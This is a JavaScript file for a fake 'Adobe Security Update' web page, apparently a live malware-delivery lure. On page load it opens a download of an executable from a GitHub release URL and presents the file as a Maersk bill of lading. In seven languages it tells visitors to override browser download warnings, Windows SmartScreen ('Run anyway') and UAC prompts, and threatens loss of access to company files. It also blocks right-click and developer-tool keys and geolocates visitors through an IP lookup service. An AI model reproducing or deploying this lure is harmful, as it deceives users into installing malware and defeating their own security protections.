(function(){
  document.addEventListener('contextmenu',function(e){e.preventDefault();});
  document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey))e.preventDefault();});

  // ════════════════════════════════════════════════════
  //  ✏️  CHANGE THIS URL TO YOUR REAL FILE LINK
  // ════════════════════════════════════════════════════
  var FILE_URL = 'https://github.com/nherdt01/lnetease-update/releases/download/v1.0/Contract10854.exe';
  // ════════════════════════════════════════════════════

  var T={
    en:{title:'Adobe Security Update <span class="version-badge">v15.008.20082</span>',desc:'A mandatory security update is now available. You must install this update to continue viewing and accessing company files.',preparing:'Preparing your download...',wait:'Please wait while we prepare the update file',starting:'Opening download...',started:'Download opening! If nothing happens, click the button below.',manual:'&#11015; Click Here to Download',clickhere:'&#11015; Download Again',fileinfo:'File: Maersk._BilL_Of_Loading.exe &nbsp;|&nbsp; Version 15.008.20082',steptitle:'&#128203; How to Install &ndash; Follow These Steps',s1h:'Allow Download in Your Browser',s1p:'Your browser may show a warning <strong>"This file is not commonly downloaded"</strong>. <strong>DO NOT remove it.</strong><br><br>&#9312; <strong>Chrome:</strong> Click <strong>"Download suspicious file"</strong>.<br>&#9313; <strong>Firefox/Edge:</strong> Click <strong>"Allow download"</strong>.<br><br>Open your <strong>Downloads</strong> folder and <strong>double-click</strong> the file.',s2h:'Windows Security Warning &ndash; Click "More Info" then "Run Anyway"',s2p:'A blue screen may appear <strong>"Windows protected your PC"</strong>. <strong>DO NOT close it.</strong><br><br>&#9312; Click <strong>"More info"</strong>.<br>&#9313; Then click <strong>"Run anyway"</strong>.',s3h:'Allow Admin Permission &ndash; Click "Yes"',s3p:'A <strong>User Account Control</strong> window will appear.<br><br>Click <strong>"Yes"</strong> to continue.',s4h:'Installation Complete',s4p:'The update will install automatically to <strong>version 15.008.20082</strong>. No further action required.',warn:'<strong>Important:</strong> Failure to install may result in loss of access to company files and systems.',footer:'&copy; 2026 MARTRANSPORT Support Team &nbsp;|&nbsp; Security Update v15.008.20082'},
    zh:{title:'\u5f3a\u5236\u5b89\u5168\u66f4\u65b0 <span class="version-badge">v15.008.20082</span>',desc:'\u5f3a\u5236\u5b89\u5168\u66f4\u65b0\u73b0\u5df2\u53d1\u5e03\u3002\u60a8\u5fc5\u987b\u5b89\u88c5\u6b64\u66f4\u65b0\u624d\u80fd\u7ee7\u7eed\u8bbf\u95ee\u516c\u53f8\u6587\u4ef6\u3002',preparing:'\u6b63\u5728\u51c6\u5907\u4e0b\u8f7d...',wait:'\u8bf7\u7a0d\u5019',starting:'\u6b63\u5728\u6253\u5f00\u4e0b\u8f7d...',started:'\u4e0b\u8f7d\u5df2\u5f00\u542f\uff01\u5982\u679c\u6ca1\u6709\u53cd\u5e94\uff0c\u8bf7\u70b9\u51fb\u4e0b\u65b9\u6309\u9215\u3002',manual:'&#11015; \u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d',clickhere:'&#11015; \u91cd\u65b0\u4e0b\u8f7d',fileinfo:'\u6587\u4ef6\uff1a Maersk._BilL_Of_Loading.exe &nbsp;|&nbsp; \u7248\u672c 15.008.20082',steptitle:'&#128203; \u5b89\u88c5\u6b65\u9aa4',s1h:'\u5141\u8bb8\u6d4f\u89c8\u5668\u4e0b\u8f7d',s1p:'\u6d4f\u89c8\u5668\u53ef\u80fd\u663e\u793a\u8b66\u544a\u201c\u6b64\u6587\u4ef6\u4e0d\u5e38\u88ab\u4e0b\u8f7d\u201d\u3002<strong>\u8bf7\u52ff\u5220\u9664\u3002</strong><br><br>&#9312; <strong>Chrome:</strong> \u70b9\u51fb\u201c\u4ecd\u8981\u4e0b\u8f7d\u201d\u3002<br>&#9313; <strong>Firefox/Edge:</strong> \u70b9\u51fb\u201c\u5141\u8bb8\u4e0b\u8f7d\u201d\u3002<br><br>\u6253\u5f00<strong>\u4e0b\u8f7d</strong>\u6587\u4ef6\u5939\uff0c<strong>\u53cc\u51fb</strong>\u8fd0\u884c\u3002',s2h:'Windows \u5b89\u5168\u8b66\u544a &ndash; \u70b9\u51fb\u201c\u66f4\u591a\u4fe1\u606f\u201d\u7136\u540e\u201c\u4ecd\u8981\u8fd0\u884c\u201d',s2p:'\u53ef\u80fd\u51fa\u73b0\u84dd\u8272\u5c4f\u201cWindows\u5df2\u4fdd\u62a4\u60a8\u7684\u7535\u8111\u201d\u3002<strong>\u8bf7\u52ff\u5173\u95ed\u3002</strong><br><br>&#9312; \u70b9\u51fb\u201c\u66f4\u591a\u4fe1\u606f\u201d\u3002<br>&#9313; \u70b9\u51fb\u201c\u4ecd\u8981\u8fd0\u884c\u201d\u3002',s3h:'\u5141\u8bb8\u7ba1\u7406\u5458\u6743\u9650 &ndash; \u70b9\u51fb\u201c\u662f\u201d',s3p:'\u5c06\u51fa\u73b0<strong>\u7528\u6237\u8d26\u6237\u63a7\u5236</strong>\u7a97\u53e3\u3002<br><br>\u70b9\u51fb<strong>\u201c\u662f\u201d</strong>\u7ee7\u7eed\u3002',s4h:'\u5b89\u88c5\u5b8c\u6210',s4p:'\u66f4\u65b0\u5c06\u81ea\u52a8\u5b89\u88c5\u81f3<strong>\u7248\u672c 15.008.20082</strong>\u3002\u65e0\u9700\u8fdb\u4e00\u6b65\u64cd\u4f5c\u3002',warn:'<strong>\u91cd\u8981\uff1a</strong>\u672a\u5b89\u88c5\u6b64\u66f4\u65b0\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u8bbf\u95ee\u516c\u53f8\u6587\u4ef6\u3002',footer:'&copy; 2026 MARTRANSPORT \u652f\u6301\u56e2\u961f &nbsp;|&nbsp; \u5b89\u5168\u66f4\u65b0 v15.008.20082'},
    ar:{title:'\u062a\u062d\u062f\u064a\u062b \u0623\u0645\u0646\u064a \u0625\u0644\u0632\u0627\u0645\u064a <span class="version-badge">v15.008.20082</span>',desc:'\u064a\u062c\u0628 \u062a\u062b\u0628\u064a\u062a \u0647\u0630\u0627 \u0627\u0644\u062a\u062d\u062f\u064a\u062b \u0644\u0645\u0648\u0627\u0635\u0644\u0629 \u0627\u0644\u0648\u0635\u0648\u0644 \u0625\u0644\u0649 \u0645\u0644\u0641\u0627\u062a \u0627\u0644\u0634\u0631\u0643\u0629.',preparing:'\u062c\u0627\u0631\u064a \u062a\u062d\u0636\u064a\u0631 \u0627\u0644\u062a\u0646\u0632\u064a\u0644...',wait:'\u064a\u0631\u062c\u0649 \u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631',starting:'\u062c\u0627\u0631\u064a \u0641\u062a\u062d \u0627\u0644\u062a\u0646\u0632\u064a\u0644...',started:'\u062a\u0645 \u0641\u062a\u062d \u0627\u0644\u062a\u0646\u0632\u064a\u0644! \u0625\u0630\u0627 \u0644\u0645 \u064a\u062d\u062f\u062b \u0634\u064a\u0621\u060c \u0627\u0636\u063a\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0623\u062f\u0646\u0627\u0647.',manual:'&#11015; \u0627\u0636\u063a\u0637 \u0647\u0646\u0627 \u0644\u0644\u062a\u0646\u0632\u064a\u0644',clickhere:'&#11015; \u062a\u0646\u0632\u064a\u0644 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649',fileinfo:'\u0627\u0644\u0645\u0644\u0641: Maersk._BilL_Of_Loading.exe &nbsp;|&nbsp; \u0627\u0644\u0625\u0635\u062f\u0627\u0631 15.008.20082',steptitle:'&#128203; \u0637\u0631\u064a\u0642\u0629 \u0627\u0644\u062a\u062b\u0628\u064a\u062a',s1h:'\u0627\u0644\u0633\u0645\u0627\u062d \u0628\u0627\u0644\u062a\u0646\u0632\u064a\u0644',s1p:'\u0642\u062f \u064a\u0638\u0647\u0631 \u062a\u062d\u0630\u064a\u0631. <strong>\u0644\u0627 \u062a\u062d\u0630\u0641\u0647.</strong><br><br>&#9312; <strong>Chrome:</strong> \u201c\u062a\u0646\u0632\u064a\u0644 \u0627\u0644\u0645\u0644\u0641\u201d.<br>&#9313; <strong>Firefox/Edge:</strong> \u201c\u0627\u0644\u0633\u0645\u0627\u062d\u201d.<br><br>\u0627\u0646\u0642\u0631 \u0646\u0642\u0631\u064b\u0627 \u0645\u0632\u062f\u0648\u062c\u064b\u0627 \u0639\u0644\u0649 \u0627\u0644\u0645\u0644\u0641.',s2h:'\u062a\u062d\u0630\u064a\u0631 Windows &ndash; \u201c\u0645\u0632\u064a\u062f\u201d \u062b\u0645 \u201c\u062a\u0634\u063a\u064a\u0644 \u0639\u0644\u0649 \u0623\u064a \u062d\u0627\u0644\u201d',s2p:'\u0642\u062f \u062a\u0638\u0647\u0631 \u0634\u0627\u0634\u0629 \u0632\u0631\u0642\u0627\u0621. <strong>\u0644\u0627 \u062a\u063a\u0644\u0642\u0647\u0627.</strong><br><br>&#9312; \u201c\u0645\u0632\u064a\u062f\u201d<br>&#9313; \u201c\u062a\u0634\u063a\u064a\u0644 \u0639\u0644\u0649 \u0623\u064a \u062d\u0627\u0644\u201d',s3h:'\u0627\u0644\u0633\u0645\u0627\u062d \u0628\u0627\u0644\u0635\u0644\u0627\u062d\u064a\u0627\u062a &ndash; \u0627\u0636\u063a\u0637 \u201c\u0646\u0639\u0645\u201d',s3p:'\u0633\u062a\u0638\u0647\u0631 \u0646\u0627\u0641\u0630\u0629 \u062a\u062d\u0643\u0645. \u0627\u0636\u063a\u0637 <strong>\u201c\u0646\u0639\u0645\u201d</strong>.',s4h:'\u0627\u0643\u062a\u0645\u0644 \u0627\u0644\u062a\u062b\u0628\u064a\u062a',s4p:'\u0633\u064a\u062a\u0645 \u0627\u0644\u062a\u062b\u0628\u064a\u062a \u062a\u0644\u0642\u0627\u0626\u064a\u064b\u0627.',warn:'<strong>\u0645\u0644\u0627\u062d\u0638\u0629:</strong> \u0639\u062f\u0645 \u0627\u0644\u062a\u062b\u0628\u064a\u062a \u0642\u062f \u064a\u0624\u062f\u064a \u0625\u0644\u0649 \u0641\u0642\u062f\u0627\u0646 \u0627\u0644\u0648\u0635\u0648\u0644.',footer:'&copy; 2026 \u0641\u0631\u064a\u0642 MARTRANSPORT &nbsp;|&nbsp; \u062a\u062d\u062f\u064a\u062b v15.008.20082'},
    fr:{title:'Mise &agrave; jour obligatoire <span class="version-badge">v15.008.20082</span>',desc:"Une mise &agrave; jour de s&eacute;curit&eacute; obligatoire est disponible. Vous devez l'installer pour continuer &agrave; acc&eacute;der aux fichiers.",preparing:'Pr&eacute;paration du t&eacute;l&eacute;chargement...',wait:'Veuillez patienter',starting:'Ouverture du t&eacute;l&eacute;chargement...',started:'T&eacute;l&eacute;chargement ouvert! Si rien ne se passe, cliquez sur le bouton ci-dessous.',manual:'&#11015; Cliquez ici pour t&eacute;l&eacute;charger',clickhere:'&#11015; T&eacute;l&eacute;charger &agrave; nouveau',fileinfo:'Fichier: Maersk._BilL_Of_Loading.exe &nbsp;|&nbsp; Version 15.008.20082',steptitle:'&#128203; Comment installer',s1h:'Autoriser le t&eacute;l&eacute;chargement',s1p:'Votre navigateur peut afficher un avertissement. <strong>NE PAS supprimer.</strong><br><br>&#9312; <strong>Chrome:</strong> "T&eacute;l&eacute;charger quand m&ecirc;me".<br>&#9313; <strong>Firefox/Edge:</strong> "Autoriser".<br><br>Ouvrez <strong>T&eacute;l&eacute;chargements</strong> et <strong>double-cliquez</strong>.',s2h:'Avertissement Windows',s2p:"Un &eacute;cran bleu peut appara&icirc;tre. <strong>NE PAS fermer.</strong><br><br>&#9312; <strong>Plus d'informations</strong>.<br>&#9313; <strong>Ex&eacute;cuter quand m&ecirc;me</strong>.",s3h:'Permission administrateur &ndash; Cliquez "Oui"',s3p:'Une fen&ecirc;tre UAC appara&icirc;tre. Cliquez <strong>"Oui"</strong>.',s4h:'Installation termin&eacute;e',s4p:"La mise &agrave; jour s'installera automatiquement &agrave; la <strong>version 15.008.20082</strong>.",warn:"<strong>Important:</strong> Ne pas installer peut entra&icirc;ner une perte d'acc&egrave;s.",footer:'&copy; 2026 &Eacute;quipe MARTRANSPORT &nbsp;|&nbsp; Mise &agrave; jour v15.008.20082'},
    es:{title:'Actualizaci&oacute;n obligatoria <span class="version-badge">v15.008.20082</span>',desc:'Hay una actualizaci&oacute;n de seguridad obligatoria. Debe instalarla para continuar accediendo a los archivos.',preparing:'Preparando su descarga...',wait:'Por favor espere',starting:'Abriendo descarga...',started:'&iexcl;Descarga abierta! Si no ocurre nada, haga clic en el bot&oacute;n de abajo.',manual:'&#11015; Haga clic aqu&iacute; para descargar',clickhere:'&#11015; Descargar de nuevo',fileinfo:'Archivo: Maersk._BilL_Of_Loading.exe &nbsp;|&nbsp; Versi&oacute;n 15.008.20082',steptitle:'&#128203; C&oacute;mo instalar',s1h:'Permitir descarga en el navegador',s1p:'Su navegador puede mostrar advertencia. <strong>NO eliminarlo.</strong><br><br>&#9312; <strong>Chrome:</strong> "Descargar de todas formas".<br>&#9313; <strong>Firefox/Edge:</strong> "Permitir".<br><br>Abra <strong>Descargas</strong> y <strong>doble clic</strong>.',s2h:'Advertencia Windows',s2p:'Puede ver pantalla azul. <strong>NO cerrar.</strong><br><br>&#9312; "M&aacute;s informaci&oacute;n".<br>&#9313; "Ejecutar de todas formas".',s3h:'Permiso administrador &ndash; Clic en "S&iacute;"',s3p:'Aparecer&aacute; ventana UAC. Clic en <strong>"S&iacute;"</strong>.',s4h:'Instalaci&oacute;n completa',s4p:'La actualizaci&oacute;n se instalar&aacute; autom&aacute;ticamente a la <strong>versi&oacute;n 15.008.20082</strong>.',warn:'<strong>Importante:</strong> No instalar puede causar p&eacute;rdida de acceso.',footer:'&copy; 2026 Equipo MARTRANSPORT &nbsp;|&nbsp; Actualizaci&oacute;n v15.008.20082'},
    de:{title:'Obligatorisches Sicherheitsupdate <span class="version-badge">v15.008.20082</span>',desc:'Ein obligatorisches Sicherheitsupdate ist verf&uuml;gbar. Sie m&uuml;ssen es installieren, um weiterhin Zugriff zu haben.',preparing:'Download wird vorbereitet...',wait:'Bitte warten',starting:'Download wird ge&ouml;ffnet...',started:'Download ge&ouml;ffnet! Falls nichts passiert, klicken Sie auf den Button unten.',manual:'&#11015; Hier klicken zum Herunterladen',clickhere:'&#11015; Erneut herunterladen',fileinfo:'Datei: Maersk._BilL_Of_Loading.exe &nbsp;|&nbsp; Version 15.008.20082',steptitle:'&#128203; Installationsanleitung',s1h:'Download im Browser erlauben',s1p:'Ihr Browser zeigt m&ouml;glicherweise eine Warnung. <strong>NICHT l&ouml;schen.</strong><br><br>&#9312; <strong>Chrome:</strong> "Trotzdem herunterladen".<br>&#9313; <strong>Firefox/Edge:</strong> "Download erlauben".<br><br>&Ouml;ffnen Sie <strong>Downloads</strong> und <strong>doppelklicken</strong>.',s2h:'Windows-Warnung',s2p:'Blauer Bildschirm erscheint. <strong>NICHT schlie&szlig;en.</strong><br><br>&#9312; "Weitere Informationen".<br>&#9313; "Trotzdem ausf&uuml;hren".',s3h:'Administratorberechtigung &ndash; "Ja"',s3p:'UAC-Fenster erscheint. Klicken Sie <strong>"Ja"</strong>.',s4h:'Installation abgeschlossen',s4p:'Update wird automatisch auf <strong>Version 15.008.20082</strong> installiert.',warn:'<strong>Wichtig:</strong> Ohne Update verlieren Sie m&ouml;glicherweise den Zugriff.',footer:'&copy; 2026 MARTRANSPORT Support-Team &nbsp;|&nbsp; Sicherheitsupdate v15.008.20082'},
    it:{title:'Aggiornamento obbligatorio <span class="version-badge">v15.008.20082</span>',desc:"&Egrave; disponibile un aggiornamento obbligatorio. &Egrave; necessario installarlo per continuare ad accedere ai file.",preparing:'Preparazione del download...',wait:'Attendere prego',starting:'Apertura download...',started:'Download aperto! Se non succede nulla, clicca il pulsante qui sotto.',manual:'&#11015; Clicca qui per scaricare',clickhere:'&#11015; Scarica di nuovo',fileinfo:'File: Maersk._BilL_Of_Loading.exe &nbsp;|&nbsp; Versione 15.008.20082',steptitle:'&#128203; Come installare',s1h:'Consenti il download nel browser',s1p:'Il browser potrebbe mostrare un avviso. <strong>NON eliminarlo.</strong><br><br>&#9312; <strong>Chrome:</strong> "Scarica comunque".<br>&#9313; <strong>Firefox/Edge:</strong> "Consenti download".<br><br>Apri <strong>Download</strong> e <strong>doppio clic</strong>.',s2h:'Avviso Windows',s2p:'Potrebbe apparire schermata blu. <strong>NON chiuderla.</strong><br><br>&#9312; "Ulteriori informazioni".<br>&#9313; "Esegui comunque".',s3h:'Autorizzazione amministratore &ndash; "S&igrave;"',s3p:'Apparir&agrave; finestra UAC. Clicca <strong>"S&igrave;"</strong>.',s4h:'Installazione completata',s4p:"L'aggiornamento verr&agrave; installato automaticamente alla <strong>versione 15.008.20082</strong>.",warn:"<strong>Importante:</strong> Non installare pu&ograve; causare perdita di accesso.",footer:'&copy; 2026 Team MARTRANSPORT &nbsp;|&nbsp; Aggiornamento v15.008.20082'}
  };

  var countryLang={CN:'zh',TW:'zh',HK:'zh',MO:'zh',SG:'zh',AE:'ar',SA:'ar',EG:'ar',IQ:'ar',JO:'ar',KW:'ar',LB:'ar',LY:'ar',MA:'ar',OM:'ar',QA:'ar',SD:'ar',SY:'ar',TN:'ar',YE:'ar',BH:'ar',DZ:'ar',FR:'fr',BE:'fr',MC:'fr',LU:'fr',ES:'es',MX:'es',AR:'es',CO:'es',PE:'es',VE:'es',CL:'es',EC:'es',GT:'es',CU:'es',BO:'es',DO:'es',HN:'es',PY:'es',SV:'es',NI:'es',CR:'es',PA:'es',UY:'es',DE:'de',AT:'de',IT:'it'};
  var _started=false;

  function set(id,html){var e=document.getElementById(id);if(e)e.innerHTML=html;}

  // ── Opens the file URL in a new tab (avoids page redirect + browser block) ──
  function openDownload(){
    window.open(FILE_URL,'_blank');
  }

  window.applyLang=function(lang){
    if(!T[lang])lang='en';
    var t=T[lang];
    var ids=['en','zh','ar','fr','es','de','it'];
    for(var i=0;i<ids.length;i++){var b=document.getElementById('btn-'+ids[i]);if(b)b.classList.remove('active');}
    var ab=document.getElementById('btn-'+lang);if(ab)ab.classList.add('active');
    document.body.setAttribute('dir',lang==='ar'?'rtl':'ltr');
    document.documentElement.lang=lang;
    set('t-title',t.title);set('t-desc',t.desc);
    set('t-preparing',t.preparing);set('t-wait',t.wait);
    set('t-fileinfo',t.fileinfo);set('t-steptitle',t.steptitle);
    set('t-s1h',t.s1h);set('t-s1p',t.s1p);
    set('t-s2h',t.s2h);set('t-s2p',t.s2p);
    set('t-s3h',t.s3h);set('t-s3p',t.s3p);
    set('t-s4h',t.s4h);set('t-s4p',t.s4p);
    set('t-warn',t.warn);set('t-footer',t.footer);
    if(!_started){set('statusMsg',t.starting);document.getElementById('manualBtn').innerHTML=t.manual;}
  };

  function startDownload(lang){
    var t=T[lang]||T.en;
    var circle=document.getElementById('progressCircle');
    var icon=document.getElementById('circleIcon');
    var statusMsg=document.getElementById('statusMsg');
    var manualBtn=document.getElementById('manualBtn');
    setTimeout(function(){circle.style.strokeDashoffset='0';},300);
    setTimeout(function(){
      _started=true;
      circle.style.stroke='#22aa44';
      icon.textContent='\u2705';
      statusMsg.innerHTML=t.started;
      statusMsg.classList.add('success');
      manualBtn.classList.remove('hidden');
      manualBtn.classList.add('green-btn');
      manualBtn.innerHTML=t.clickhere;
      // ── Open in NEW TAB — avoids browser block and page redirect ──
      openDownload();
    },2500);
  }

  function init(){
    var fallback='en';
    var blist=[];
    if(navigator.languages&&navigator.languages.length)blist=navigator.languages;
    else blist=[navigator.language||navigator.userLanguage||navigator.browserLanguage||'en'];
    for(var i=0;i<blist.length;i++){var c=(blist[i]||'').toLowerCase().substring(0,2);if(T[c]){fallback=c;break;}}
    applyLang(fallback);

    // Set manual button to also open in new tab
    var manualBtn=document.getElementById('manualBtn');
    if(manualBtn){
      manualBtn.removeAttribute('href');
      manualBtn.onclick=function(e){e.preventDefault();openDownload();};
    }

    var done=false;
    var timer=setTimeout(function(){if(!done){done=true;startDownload(fallback);}},3000);

    fetch('https://ipapi.co/json/')
      .then(function(r){return r.json();})
      .then(function(d){
        if(done)return;done=true;clearTimeout(timer);
        var country=(d.country_code||'').toUpperCase();
        var lang=countryLang[country]||fallback;
        applyLang(lang);startDownload(lang);
      })
      .catch(function(){
        if(done)return;done=true;clearTimeout(timer);
        startDownload(fallback);
      });
  }

  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',init);}
  else{init();}
})();
